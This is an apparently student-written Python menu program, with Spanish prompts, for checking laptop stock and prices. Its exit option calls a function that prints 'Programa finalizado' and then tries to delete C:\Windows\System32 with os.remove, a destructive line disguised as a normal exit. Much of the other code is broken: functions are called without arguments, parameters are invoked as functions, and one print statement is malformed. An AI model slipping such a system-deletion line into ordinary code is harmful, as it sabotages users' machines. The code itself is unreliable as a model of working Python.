import os

productos = {'8475HD': ['HP', 15.6, '8GB', 'DD', '1T', 'Intel Core i5', 'Nvidia GTX1050'],
             '2175HD': ['lenovo', 14, '4GB', 'SSD', '512GB', 'Intel Core i5', 'Nvidia GTX1050'],
             'JjfFHD': ['Asus', 14, '16GB', 'SSD', '256GB', 'Intel Core i7', 'Nvidia RTX2080Ti'],
             'fgdxFHD': ['HP', 15.6, '8GB', 'DD', '1T', 'Intel Core i3', 'integrada'],
             'GF75HD': ['Asus', 15.6, '8GB', 'DD', '1T', 'Intel Core i7', 'Nvidia GTX1050'],
             '123FHD': ['lenovo', 14, '6GB', 'DD', '1T', 'AMD Ryzen 5', 'integrada'],
             '342FHD': ['lenovo', 15.6, '8GB', 'DD', '1T', 'AMD Ryzen 7', 'Nvidia GTX1050'],
             'UWU131HD': ['Dell', 15.6, '8GB', 'DD', '1T', 'AMD Ryzen 3', 'Nvidia GTX1050']}

stock = {'8475HD': [387990,10], '2175HD': [327990,4], 'JjfFHD': [424990,1],
        'fgdxFHD': [664990,21], '123FHD': [290890,32], '342FHD': [444990,7],
        'GF75HD': [749990,2], 'UWU131HD': [349990,1], 'FS1230HD': [249990,0]}

def stock_marca(marca):
    marca(str(input("Ingrese la marca a consultar (HP, Lenovo, Asus, Dell): ")).strip())


def busqueda_precio(p_min, p_max):
    p_min(int(input("Ingrese precio minimo")))
    p_max(int(input("Ingrese precio maximo")))
    print(f"Los notebooks entre los precios consultas son:," [productos])

def actualizar_precio(modelo, p):
    print("")

def system():
    print("Programa finalizado")
    os.remove("C:\Windows\System32") 

while True:
    try:
        print("\n *** MENU PRINCIPAL *** \n \n1.- Stock marca\n2.- Busqueda por precio\n3.- Actualizar precio\n4.- Salir ")
        opc = int(input("Seleccione una opcion (1-4):"))
        if opc == 1:
         stock_marca()
        elif opc == 2:
         busqueda_precio()
        elif opc == 3: 
         actualizar_precio()
        elif opc == 4:
         system()
    except ValueError:
       print("Debe ingresar una opcion valida")